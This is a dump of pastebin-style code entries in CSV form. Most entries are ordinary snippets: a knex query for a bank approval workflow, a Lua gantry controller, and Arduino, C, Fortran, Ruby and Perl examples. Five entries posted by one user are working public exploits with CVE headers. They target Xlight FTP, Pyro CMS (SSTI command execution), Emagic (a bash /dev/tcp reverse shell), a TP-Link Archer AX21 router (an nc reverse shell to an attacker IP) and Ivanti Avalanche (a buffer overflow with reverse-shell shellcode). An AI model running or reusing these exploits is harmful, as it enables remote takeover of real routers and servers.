id,title,username,language,date,content
p1EiXgTp,Untitled,ma39isy,JavaScript,Sunday 21st of January 2024 11:25:12 PM CDT,"const dataMasterPermohonanquery = knex('master_permohonan as mp')
        .select('mp.*', 'res.id_elevation', 'res.kode_aksi', 'ra.nama', 'res.tanggal_approve', 'res.pemutus', 'res.catatan as catatan', 'res.update_is_direksi')
        .leftJoin('ref_elevation_status as res', 'res.id_ref_status','mp.status')
        .leftJoin('ref_action as ra', 'ra.kode_aksi', 'res.kode_aksi')
        .where('mp.id', requestBody.idPermohonan)
        .where('res.kode_aksi', requestBody.kodeAksi)

const dataMasterPermohonan = await dataMasterPermohonanquery
        .first()

        let update_catatan = dataMasterPermohonan.catatan
        let update_pemutus = dataMasterPermohonan.pemutus
        let tanggal_approve = dataMasterPermohonan.tanggal_approve
           

            if (dataMasterPermohonan.update_is_direksi === true) {
                if(dataMasterPermohonan.status === 15){
                    dataMasterPermohonanquery.where('master_permohonan.is_direksi', knex.raw('ref_elevation_status.check_direksi'));
                    const tes = await dataMasterPermohonanquery.first()
                    console.log(tes)
                }

                await knex('master_permohonan')
                    .where('id', '=', requestBody.idPermohonan)
                    .update({
                    status : dataMasterPermohonan.id_elevation,
                    [update_catatan]: requestBody.catatan, 
                    [update_pemutus]: user.FullName, 
                    is_direksi:requestBody.isDireksi, 
                    [tanggal_approve] : currentDate
                });
               
                if (dataMasterPermohonan.id_elevation === 7) {
                    const innerDataMasterPermohonan = await knex('master_permohonan as mp')
                           .select(
                               'mp.id', 
                               'mp.no_rekening', 
                               'mp.nama_nasabah', 
                               'mp.nominal', 
                               'mp.eq', 
                               'mp.nisbah', 
                               'mp.tanggal', 
                               'mp.idcabang', 
                               'mp.idinduk', 
                               'rj.jangka_waktu', 
                               'rj.hari', 
                               'rs.status', 
                               'rs.id as idstatus', 
                               knex.raw(`
                                   case
                                       when mp.jenis_permohonan = 1
                                       then 'Penempatan Baru'
   
                                       else 'Perpanjangan'
                                   end as pengajuan
                               `),
                               knex.raw(`
                                   case 
                                       when mp.jenis_kepemilikan = 1 
                                       then 'Ritel'
   
                                       else 'Korporasi'
                                   end as pemilik
                               `), 
                               knex.raw(`
                                   case 
                                       when jenis_deposito = 1 
                                       then 'Bagi Hasil'
   
                                       else 'Jualah'
                                   end as deposito
                               `)
                           )
                           .leftJoin('ref_jangka as rj', 'rj.id', 'mp.idjangka')
                           .leftJoin('ref_status as rs', 'rs.id', 'mp.status')
                           .where('mp.id', '=', requestBody.idPermohonan)
                           .first();
   
                       const innerDataMasterEmail = await knex('master_email as me')
                           .leftJoin('master_permohonan as mp', 'mp.id', 'me.id_pemohon')
                           .where('me.id_pemohon', '=', requestBody.idPermohonan)
                           .select('me.email')
                           .first();
   
                       console.log('innerDataMasterEmail.email : ', innerDataMasterEmail.email);
                       const innerCcEmail = innerDataMasterEmail.email.split(',');
                       console.log('innerccEmail : ', innerCcEmail);
   
                       const htmlTemplate = `
                           <html>
                               <body>
                                   <p><i><strong> Assalamualaikum wr wb </strong></i></p>
                                   <p> Berikut data permohonan special nisbah : </p>
                                   </br>
                                   <p> Jenis Permohonan : ${innerDataMasterPermohonan.pengajuan} </p>
                                   <p> Segmentasi : ${innerDataMasterPermohonan.pemilik} </p>
                                   <p> Jenis Deposito : ${innerDataMasterPermohonan.deposito} </p>
                                   <p> Nama Nasabah : ${innerDataMasterPermohonan.nama_nasabah} </p>
                                   <p> Nominal : ${innerDataMasterPermohonan.nominal.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, ""$1,"")} </p>
                                   <p> Jangka Waktu : ${innerDataMasterPermohonan.jangka_waktu} </p>
                                   <p> Nisbah : ${innerDataMasterPermohonan.nisbah} % </p>
                                   <p> Indikasi E.q rate dimohon : ${innerDataMasterPermohonan.eq} % </p>
                                   <p> Email ini dibuat secara otomatis. Mohon tidak mengirimkan balasan ke email ini. </p>
                                   </br>
                                   <p><i><strong> Wassalamualaikum wr wb </strong></i></p>
                                   <p> Bank BJB Syariah </p>
                               </body>
                           </html>
                       `;
   
                       await kirimEmail(
                           innerCcEmail, 
                           innerCcEmail, 
                           'SPECIAL NISBAH IB MASLAHAH', 
                           htmlTemplate
                       );
                }
            }else{
                if(dataMasterPermohonan.kode_aksi === 'A'){
                    await knex('master_permohonan')
                    .where('id', '=', requestBody.idPermohonan)
                    .update({
                    status : dataMasterPermohonan.id_elevation,
                    [update_catatan]: requestBody.catatan, 
                    [update_pemutus]: user.FullName, 
                    [tanggal_approve] : currentDate
                    });
                    
                }else{
                    await knex('master_permohonan')
                    .where('id', '=', requestBody.idPermohonan)
                    .update({
                    status : dataMasterPermohonan.id_elevation,
                    [update_catatan]: requestBody.catatan, 
                    });

                }
            }"
UDEHjYPk,Untitled,Tkap1,JavaScript,Sunday 21st of January 2024 11:05:26 PM CDT,"

class Tokenizer
{
	tokens = [];
	index = 0;
	consume_type_text(type, text) {
		if(tokens[index].type === type && tokens[index].text === text) {
			index += 1;
			return tokens[index - 1];
		}
		return null;
	}
	consume_type(type)
	{
		if(tokens[index].type === type) {
			index += 1;
			return tokens[index - 1];
		}
		return null;
	}
};


function parseTag(tokenizer) {
	if(!tokenizer.consume_type_text(""symbol"", ""<"")) { return {null, null}; }

	let token = tokenizer.consume_type(""identifier"", ""<"")
	if(token === null) { return {null, null}; }

	// ...
	// On success, something like
	return {node, tokenizer}

}

function parse(tokens) {
	let tokenizer = new Tokenizer();
	tokenizer.tokens = tokens;
	tokenizer.index = 0;

	// We don't want to pass a reference, because it will get modified even it we don't successfully parse a tag.
	parseTag({...tokenizer});
}"
StzRGDM3,Senju,PapiGemezs,PHP,Sunday 21st of January 2024 11:00:27 PM CDT,"{
   ""Senju"": [
      {
         ""version"": 1.1
      }
   ]
}"
swuVQA6y,smarter main,Claire9201,Lua,Sunday 21st of January 2024 10:59:01 PM CDT,"local motor = peripheral.wrap(""back"")


local DEBUG = true


local GRIDMULTX = 4
local GRIDMULTZ = 8


local currentPosition = {0,0,0}


local stickersEnabled = false


function toggleStickers()
  redstone.setOutput(""top"",true)
  sleep(0.5)
  redstone.setOutput(""top"",false)
  sleep(0.5)
  
  stickersEnabled = not stickersEnabled

  if DEBUG then
    print(""toggled stickers, state: "" .. tostring(stickersEnabled))
  end
end

function resetOutputs()
  redstone.setOutput(""left"",false)
  redstone.setOutput(""right"",false)
  
  if DEBUG then
    print(""reset outputs"")
  end
end

function waitTilFinished()
  repeat sleep(0.1) until not motor.isRunning()
  sleep(1)
  
  if DEBUG then
    print(""movement finished"")
  end
end


function newMoveX(targetX)

  print(targetX)
  print(currentPosition[1])

  local movement = targetX-currentPosition[1]
  print(movement)
  local movementType = 1
  if movement < 0 then
    movementType = -1
  end

  print(movement)
  print(math.abs(movement))
  print(movementType)

  resetOutputs()
  redstone.setOutput(""left"",true)
  sleep(.5)
  if DEBUG then
    print(""moving X"")
  end
  motor.move(math.abs(movement),-movementType)
  currentPosition[1] = currentPosition[1]+movement
  waitTilFinished()

end
function newMoveY(targetY)

  local movement = targetY-currentPosition[2]
  local movementType = 1
  if movement < 0 then
    movementType = -1
  end

  resetOutputs()
  redstone.setOutput(""left"",true)
  redstone.setOutput(""right"",true)
  sleep(.5)
  if DEBUG then
    print(""moving Y"")
  end
  motor.move(math.abs(movement),movementType)
  currentPosition[2] = currentPosition[2]+movement
  waitTilFinished()

end
function newMoveZ(targetZ)

  local movement = targetZ-currentPosition[3]
  local movementType = 1
  if movement < 0 then
    movementType = -1
  end

  resetOutputs()
  sleep(.5)
  if DEBUG then
    print(""moving Z"")
  end
  motor.move(math.abs(movement),movementType)
  currentPosition[3] = currentPosition[3]+movement
  waitTilFinished()

end


function moveX(movement,direction)
  resetOutputs()
  redstone.setOutput(""left"",true)
  sleep(.5)
  if DEBUG then
    print(""moving X"")
  end
  motor.move(movement,-direction)
  currentPosition[1] = currentPosition[1]+(movement*-direction)
  waitTilFinished()
end

function moveZ(movement,direction)
  resetOutputs()
  sleep(.5)
  if DEBUG then
    print(""moving Z"")
  end
  motor.move(movement,direction)
  currentPosition[3] = currentPosition[3]+(movement*direction)
  waitTilFinished()
end

function moveY(movement,direction)
  resetOutputs()
  redstone.setOutput(""left"",true)
  redstone.setOutput(""right"",true)
  sleep(.5)
  if DEBUG then
    print(""moving Y"")
  end
  motor.move(movement,direction)
  currentPosition[2] = currentPosition[2]+(movement*direction)
  waitTilFinished()
end


function resetGantry()
  
  if not redstone.getInput(""bottom"") then
    moveY(11,-1)
  end
  
  while not redstone.getInput(""bottom"") do
    if not redstone.getInput(""bottom"") then
      moveX(6,-1)
    end
    if not redstone.getInput(""bottom"") then
      moveZ(6,-1)
    end
  end

  currentPosition = {0,0,0}

  if DEBUG then
    print(""reset gantry"")
  end

end


function moveToPoint(x,y,z)
  
  if DEBUG then
    print(""moving to point: ("".. tostring(x) .. "", "" .. tostring(y) .. "", "" .. tostring(z) .. "")"")
  end

  newMoveX((x-1)*GRIDMULTX)
  newMoveZ((z-1)*GRIDMULTZ)
  newMoveY(y)

end


function grabContainer()

  if stickersEnabled then
    toggleStickers()
  end

  newMoveY(11)
  
  if not stickersEnabled then
    toggleStickers()
  end
  
  newMoveY(0)

end

function dropContainer()

  if not stickersEnabled then
    toggleStickers()
  end

  newMoveY(11)
  
  if stickersEnabled then
    toggleStickers()
  end
  
  newMoveY(0)

end


function grabContainerAt(x,z)

  moveToPoint(x,0,z)
  grabContainer()

end

function dropContainerAt(x,z)

  moveToPoint(x,0,z)
  dropContainer()

end

function printCurrentPosition()
  print(currentPosition[1])
  print(currentPosition[2])
  print(currentPosition[3])
end

function moveContainerTo(x1,z1,x2,z2)

  grabContainerAt(x1,z1)
  dropContainerAt(x2,z2)

end


resetGantry()

while true do
  moveContainerTo(2,3,1,2)
  sleep(2)
  moveContainerTo(3,2,2,3)
  sleep(2)
  moveContainerTo(1,2,3,2)
  sleep(2)
end"
cSrVbMb4,Pet Simulator 99 Auto Fish v3,Killyoboy,Autohotkey,Sunday 21st of January 2024 10:56:34 PM CDT,"#MaxThreadsPerHotKey, 2
Toggle := 0
 
F1::
Toggle := !Toggle
 
While (Toggle) {
    Click
    Sleep, 3000
    Click
    Sleep, 100
    PixelSearch, tapX, tapY, 1499, 246, 1499, 872, 0x000000, 1, fast, RGB

    If (tapX) {
        While (tapX && Toggle) {
            Click
            Sleep, 10
            PixelSearch, tapX, tapY, 1499, 246, 1499, 872, 0x000000, 1, fast, RGB
        }
    }
}"
4tkzZ2jK,Mad,Unknown_No_1,PHP,Sunday 21st of January 2024 10:41:13 PM CDT,KalpoHatersByMad
Luz3nV2w,program fortran pertamaku,paperline27,Fortran,Sunday 21st of January 2024 10:20:26 PM CDT,"program HelloWorld
  ! Ini adalah program Hello, World! dalam Fortran
  
  ! Deklarasi pernyataan
  implicit none
  
  ! Bagian utama program
  write(*,*) 'Hello, World!'
  
end program HelloWorld

! jalankan program
! gfortran hello.f90 -o hello
! ./hello"
buyxgapy,Xlight FTP Server 3.9.3.6 - 'Stack Buffer Overflow' (DOS),FlyFar,Python,Sunday 21st of January 2024 10:08:34 PM CDT,"# Exploit Title: Xlight FTP Server 3.9.3.6 - 'Stack Buffer Overflow' (DOS)
# Discovered by: Yehia Elghaly
# Discovered Date: 2023-08-04
# Vendor Homepage: https://www.xlightftpd.com/
# Software Link : https://www.xlightftpd.com/download/setup.exe
# Tested Version: 3.9.3.6
# Vulnerability Type: Buffer Overflow Local
# Tested on OS: Windows XP Professional SP3 - Windows 11 x64

# Description: Xlight FTP Server 3.9.3.6 'Execute Program' Buffer Overflow (PoC)

# Steps to reproduce:
# 1. - Download and Xlight FTP Server
# 2. - Run the python script and it will create exploit.txt file.
# 3. - Open Xlight FTP Server 3.9.3.6
# 4. - ""File and Directory - Modify Virtual Server Configuration - Advanced - Misc- Setup 
# 6. - Execute a Program after use logged in-  Paste the characters 
# 7  - Crashed

#!/usr/bin/env python3

exploit = 'A' * 294

try: 
    with open(""exploit.txt"",""w"") as file:
        file.write(exploit)
    print(""POC is created"")
except:
    print(""POC not created"")
            "
EgCL3beE,Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated) - CVE-2023-29689,FlyFar,Python,Sunday 21st of January 2024 10:06:26 PM CDT,"# Exploit Title: Pyro CMS 3.9 - Server-Side Template Injection (SSTI) (Authenticated)
# Exploit Author: Daniel Barros (@cupc4k3d) - Hakai Offensive Security
# Date: 03/08/2023
# Vendor: https://pyrocms.com/
# Software Link: https://pyrocms.com/documentation/pyrocms/3.9/getting-started/installation
# Vulnerable Version(s): 3.9
# CVE: CVE-2023-29689
# Notes: You need a user who has access to /admin privilege

# Example Usage:
# First, run the script: python3 CVE-2023-29689.py
# Please follow these steps:
# 1. Enter the application URL: http://localhost:8000
# 2. Enter the email for authentication: admin@adm.com
# 3. Enter the password: Admin@@2023
# 4. Enter the command to be executed: id
# Result of command execution:
# uid=1000(cupcake) gid=1000(cupcake) groups=1000(cupcake)

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def login(session, url, email, password):
    login_url = urljoin(url, '/admin/login')
    response = session.get(login_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    token = soup.find('input', {'name': '_token'})['value']

    payload = {
        '_token': token,
        'email': email,
        'password': password
    }

    session.post(login_url, data=payload)

# Function to edit role 1 and extract the Description of the Admin user.
def edit_role_and_extract_description(session, url, command):
    edit_role_url = urljoin(url, '/admin/users/roles/edit/1')
    response = session.get(edit_role_url)
    soup = BeautifulSoup(response.content, 'html.parser')
    token = soup.find('input', {'name': '_token'})['value']

    payload = {
        '_token': token,
        'name_en': 'Admin',
        'slug': 'admin',
        'description_en': f'{{{{[""{command}""]|map(""system"")|join}}}}',
        'action': 'save_exit'
    }

    session.post(edit_role_url, data=payload)

    # Extract the updated Description from role 1.
    response = session.get(urljoin(url, '/admin/users/roles'))
    soup = BeautifulSoup(response.content, 'html.parser')
    description = soup.find('td', {'data-title': 'Description'}).text.strip()

    return description
    
def main():
    url = input(""Enter the application URL: "")
    email = input(""Enter the email for authentication: "")
    password = input(""Enter the password : "")
    command = input(""Enter the command to be executed: "")

    with requests.Session() as session:
        login(session, url, email, password)
        description = edit_role_and_extract_description(session, url, command)
        print(""\nResult of command execution:"")
        print(description)

if __name__ == ""__main__"":
    main()
            "
zyk78E4p,Emagic Data Center Management Suite v6.0 - OS Command Injection - CVE-2023-37569,FlyFar,Bash,Sunday 21st of January 2024 10:00:52 PM CDT,"#!/bin/bash

# Exploit Title: Emagic Data Center Management Suite v6.0 - OS Command Injection
# Date: 03-08-2023
# Exploit Author: Shubham Pandey & thewhiteh4t
# Vendor Homepage: https://www.esds.co.in/enlight360
# Version: 6.0.0
# Tested on: Kali Linux
# CVE : CVE-2023-37569

URL=$1
LHOST=$2
LPORT=$3

echo ""*****************************""
echo ""*  ESDS eMagic 6.0.0 RCE    *""
echo ""*  > CVE-2023-37569         *""
echo ""*  > Shubham & thewhiteh4t  *""
echo ""*****************************""

if [ $# -lt 3 ]; then
    echo """"""
USAGE :

./exploit.sh http://<IP> <LHOST> <LPORT>
./exploit.sh http://192.168.0.10 192.168.0.20 1337
""""""
    exit 1
fi

url=""$1/index.php/monitor/operations/utilities/""

echo ""[+] URL   : $URL""
echo ""[+] LHOST : $LHOST""
echo ""[+] LPORT : $LPORT""
echo

payload=""bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F$LHOST%2F$LPORT%200%3E%261%27""

post_data=""utility=ping&operations=yes&hostname=%3B%20$payload&param_before=&param_after=&probe_id=1&rndval=1682490204846""

echo ""[!] Triggering exploit...""

echo $url

(sleep 3; curl -s -X POST -d $post_data $url > /dev/null) &

echo ""[+] Catching shell...""
nc -lvp 4444
            "
hjYjapzn,retry_read_tca,mikroavr,Arduino,Sunday 21st of January 2024 09:53:43 PM CDT,"#include <Wire.h>
#include ""TCA9555.h""
TCA9555 TCA1(0x20);
TCA9555 TCA2(0x21);
byte pin_tca[] = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 };

#define TCA9555_INPUT_PORT_REGISTER_0 0x00  //  read(0-7)
#define TCA9555_INPUT_PORT_REGISTER_1 0x01  //  read(8-15)
byte data_tca1_port0 = 0;
byte data_tca1_port1 = 0;
unsigned long cur_time, old_time;
bool port0 = 0;
bool port1 = 1;

byte addr_tca1 = 0x20;
byte addr_tca2 = 0x21;

void setup() {
  // put your setup code here, to run once:
  Serial.begin(115200);
  Wire.begin();
  TCA1.begin();
  TCA2.begin();
  for (int i = 0; i < sizeof(pin_tca); i++) {
    Serial.print(i);
    Serial.print("","");
    TCA1.pinMode(pin_tca[i], INPUT_PULLUP);
    TCA2.pinMode(pin_tca[i], INPUT_PULLUP);
  }
}

void loop() {
  // put your main code here, to run repeatedly:
  cur_time = millis();
  if (cur_time - old_time > 100) {
    byte _retry = 0;
    while (!baca_input1(addr_tca1, port0) && _retry < 10) {
      _retry++;
      Serial.print(""retry: "");
      Serial.println(_retry);
      delay(20);
    }
    _retry = 0;
    while (!baca_input1(addr_tca1, port1) && _retry < 10) {
      _retry++;
      Serial.print(""retry: "");
      Serial.println(_retry);
      delay(20);
    }

    Serial.print(""tca1 port0: "");
    Serial.println(data_tca1_port0,HEX);
    Serial.print(""tca1 port1: "");
    Serial.println(data_tca1_port1,HEX);

    old_time = millis();
  }
}

bool baca_input1(byte addr, byte mask) {
  bool flag_tca = 0;
  Wire.beginTransmission(addr);
  switch (mask) {
    case 0:
      Wire.write(TCA9555_INPUT_PORT_REGISTER_0);
      break;
    case 1:
      Wire.write(TCA9555_INPUT_PORT_REGISTER_1);
      break;
  }

  int rv = 0;
  rv = Wire.endTransmission();
  if (rv != 0) {
    flag_tca = 0;
    Serial.println(""gagal baca"");
  } else {
    Wire.requestFrom(addr, (uint8_t)1);
    switch (mask) {
      case 0:
        data_tca1_port0 = Wire.read();
        break;
      case 1:
        data_tca1_port1 = Wire.read();
        break;
    }

    flag_tca = 1;
  }
  return flag_tca;
}
"
jYm0vZ8p,Untitled,larrylailai,C,Sunday 21st of January 2024 09:51:37 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#define new(type) (type*)malloc(sizeof(type))
typedef unsigned long long ull;
 
void printans(int ans[11][11]){
    for (int i=1; i<=9; i++) for (int j=1; j<=9; j++) printf(""%d%c"", ans[i][j], "" \n""[j==9]);
}
 
bool valid(int map[9][9], int ans[11][11], int r, int c){
    int count=0;
    for (int m=-1; m<2; m++){
        for (int n=-1; n<2; n++) count+=ans[r+m+1][c+n+1];
    }
    return (count==map[r][c]);
}
 
bool check(int map[9][9], int ans[11][11], int index){
    int r = index/9, c = index%9;
    bool result = true;
    if (r*c!=0){
        result &= valid(map, ans, r-1, c-1);
        if (c==8) result &= valid(map, ans, r-1, c);
        if (r==8) result &= valid(map, ans, r, c-1);
        if (r==8 && c==8) result &= valid(map, ans, r, c);
    }
    return result;
}
 
bool recursion(int map[9][9], int ans[11][11], int index){
    int r = index/9, c = index%9;
    if (index==81) return true;
    ans[r+1][c+1] = 0;
    if (check(map, ans, index) && recursion(map, ans, index+1)) return true;
    ans[r+1][c+1] = 1;
    if (check(map, ans, index) && recursion(map, ans, index+1)) return true;
    return false;
}
 
int main(){
    int map[9][9], ans[11][11]={0};
    for (int i=0; i<9; i++) for (int j=0; j<9; j++) scanf(""%d"", &map[i][j]); 
    if (recursion(map, ans, 0)) printans(ans);
    else printf(""no solution\n"");
}"
TLvWhngJ,TP-Link Archer AX21 - Unauthenticated Command Injection - CVE-2023-1389,FlyFar,Python,Sunday 21st of January 2024 09:50:35 PM CDT,"#!/usr/bin/python3
# 
# Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection
# Date: 07/25/2023
# Exploit Author: Voyag3r (https://github.com/Voyag3r-Security)
# Vendor Homepage: https://www.tp-link.com/us/
# Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 (https://www.tenable.com/cve/CVE-2023-1389)
# Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0
# CVE: CVE-2023-1389
#
# Disclaimer: This script is intended to be used for educational purposes only.
# Do not run this against any system that you do not have permission to test. 
# The author will not be held responsible for any use or damage caused by this 
# program. 
# 
# CVE-2023-1389 is an unauthenticated command injection vulnerability in the web
# management interface of the TP-Link Archer AX21 (AX1800), specifically, in the
# *country* parameter of the *write* callback for the *country* form at the 
# ""/cgi-bin/luci/;stok=/locale"" endpoint. By modifying the country parameter it is 
# possible to run commands as root. Execution requires sending the request twice;
# the first request sets the command in the *country* value, and the second request 
# (which can be identical or not) executes it. 
# 
# This script is a short proof of concept to obtain a reverse shell. To read more 
# about the development of this script, you can read the blog post here:
# https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94
# Before running the script, start a nc listener on your preferred port -> run the script -> profit

import requests, urllib.parse, argparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress warning for connecting to a router with a self-signed certificate
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Take user input for the router IP, and attacker IP and port
parser = argparse.ArgumentParser()

parser.add_argument(""-r"", ""--router"", dest = ""router"", default = ""192.168.0.1"", help=""Router name"")
parser.add_argument(""-a"", ""--attacker"", dest = ""attacker"", default = ""127.0.0.1"", help=""Attacker IP"")
parser.add_argument(""-p"", ""--port"",dest = ""port"", default = ""9999"", help=""Local port"")

args = parser.parse_args()

# Generate the reverse shell command with the attacker IP and port
revshell = urllib.parse.quote(""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "" + args.attacker + "" "" + args.port + "" >/tmp/f"")

# URL to obtain the reverse shell
url_command = ""https://"" + args.router + ""/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$("" + revshell + "")""

# Send the URL twice to run the command. Sending twice is necessary for the attack
r = requests.get(url_command, verify=False)
r = requests.get(url_command, verify=False)
            "
8HGcCzKM,Ivanti Avalanche <v6.4.0.0 - Remote Code Execution - CVE-2023-32560,FlyFar,Python,Sunday 21st of January 2024 09:48:36 PM CDT,"""""""
Exploit Title: Ivanti Avalanche <v6.4.0.0 - Remote Code Execution
Date: 2023-08-16
Exploit Author: Robel Campbell (@RobelCampbell)
Vendor Homepage: https://www.ivanti.com/
Software Link: https://www.wavelink.com/download/Downloads.aspx?DownloadFile=27550&returnUrl=/Download-Avalanche_Mobile-Device-Management-Software/
Version: v6.4.0.0
Tested on: Windows 11 21H2
CVE: CVE-2023-32560
Reference: https://www.tenable.com/security/research/tra-2023-27
""""""

import socket
import struct
import sys

# Create an item structure for the header and payload
class Item:
    def __init__(self, type_, name, value):
        self.type = type_
        self.name = name.encode()
        self.value = value
        self.name_size = 0x5
        self.value_size = 0x800

    def pack(self):
        return struct.pack('>III{}s{}s'.format(self.name_size, self.value_size),
                           self.type, self.name_size, self.value_size, self.name, self.value)

# Create a header structure
class HP:
    def __init__(self, hdr, payload):
        self.hdr = hdr
        self.payload = payload
        self.pad = b'\x00' * (16 - (len(self.hdr) + len(self.payload)) % 16)

    def pack(self):
        return b''.join([item.pack() for item in self.hdr]) + \
               b''.join([item.pack() for item in self.payload]) + self.pad

# Create a preamble structure
class Preamble:
    def __init__(self, hp):
        self.msg_size = len(hp.pack()) + 16
        self.hdr_size = sum([len(item.pack()) for item in hp.hdr])
        self.payload_size = sum([len(item.pack()) for item in hp.payload])
        self.unk = 0  # Unknown value

    def pack(self):
        return struct.pack('>IIII', self.msg_size, self.hdr_size, self.payload_size, self.unk)

# Create a message structure
class Msg:
    def __init__(self, hp):
        self.pre = Preamble(hp)
        self.hdrpay = hp

    def pack(self):
        return self.pre.pack() + self.hdrpay.pack()

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.86.30 LPORT=4444 exitfunc=thread -f python
shellcode =  b""""
shellcode += b""fce8820000006089e531c064""
shellcode += b""8b50308b520c8b52148b7228""
shellcode += b""0fb74a2631ffac3c617c022c""
shellcode += b""20c1cf0d01c7e2f252578b52""
shellcode += b""108b4a3c8b4c1178e34801d1""
shellcode += b""518b592001d38b4918e33a49""
shellcode += b""8b348b01d631ffacc1cf0d01""
shellcode += b""c738e075f6037df83b7d2475""
shellcode += b""e4588b582401d3668b0c4b8b""
shellcode += b""581c01d38b048b01d0894424""
shellcode += b""245b5b61595a51ffe05f5f5a""
shellcode += b""8b12eb8d5d68333200006877""
shellcode += b""73325f54684c772607ffd5b8""
shellcode += b""9001000029c454506829806b""
shellcode += b""00ffd5505050504050405068""
shellcode += b""ea0fdfe0ffd5976a0568c0a8""
shellcode += b""561e680200115c89e66a1056""
shellcode += b""576899a57461ffd585c0740c""
shellcode += b""ff4e0875ec68f0b5a256ffd5""
shellcode += b""68636d640089e357575731f6""
shellcode += b""6a125956e2fd66c744243c01""
shellcode += b""018d442410c6004454505656""
shellcode += b""5646564e565653566879cc3f""
shellcode += b""86ffd589e04e5646ff306808""
shellcode += b""871d60ffd5bbe01d2a0a68a6""
shellcode += b""95bd9dffd53c067c0a80fbe0""
shellcode += b""7505bb4713726f6a0053ffd5""

buf = b'90' * 340
buf += b'812b4100' # jmp esp (0x00412b81)
buf += b'90909090'
buf += b'90909090'
buf += shellcode
buf += b'41' * 80
buf += b'84d45200' # stack pivot: add esp, 0x00000FA0 ; retn 0x0004 ; (0x0052d484)
buf += b'43' * (0x800 - len(buf))

buf2 = b'41' * 0x1000

# Create message payload
hdr = [Item(3, ""pwned"", buf)]
payload = [Item(3, ""pwned"", buf2)] # dummy payload, probabaly not necessary
hp_instance = HP(hdr, payload)
msg_instance = Msg(hp_instance)

# Default port
port = 1777

# check for target host argument
if len(sys.argv) > 1:
    host = sys.argv[1]
else:
    print(""Usage: python3 CVE-2023-32560.py <host ip>"")
    sys.exit()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(msg_instance.pack())
    print(""Message sent!"")
    s.close()
            "
gFbCMtZk,server&client.rb,paperline27,Ruby,Sunday 21st of January 2024 09:29:00 PM CDT,"#server
require 'drb'

class Calculator
  def add(a, b)
    a + b
  end
end

calculator = Calculator.new
DRb.start_service('druby://localhost:12345', calculator)
DRb.thread.join


#client
require 'drb'

DRb.start_service
calculator = DRbObject.new_with_uri('druby://localhost:12345')

result = calculator.add(5, 3)
puts ""Result of remote addition: #{result}"""
7VQqLBf3,jumlah kata pada file teks.txt,paperline27,Perl,Sunday 21st of January 2024 09:10:32 PM CDT,"# Program untuk menghitung jumlah kata dalam sebuah berkas teks

# Membuka berkas teks
open my $file_handle, '<', 'teks.txt' or die ""Tidak dapat membuka berkas: $!"";

# Inisialisasi variabel untuk menghitung jumlah kata
my $jumlah_kata = 0;

# Membaca setiap baris dalam berkas
while (my $baris = <$file_handle>) {
    # Memecah baris menjadi kata-kata
    my @kata_kata = split /\s+/, $baris;

    # Menambah jumlah kata
    $jumlah_kata += scalar @kata_kata;
}

# Menutup berkas
close $file_handle;

# Menampilkan jumlah kata
print ""Jumlah kata dalam berkas: $jumlah_kata\n"";"
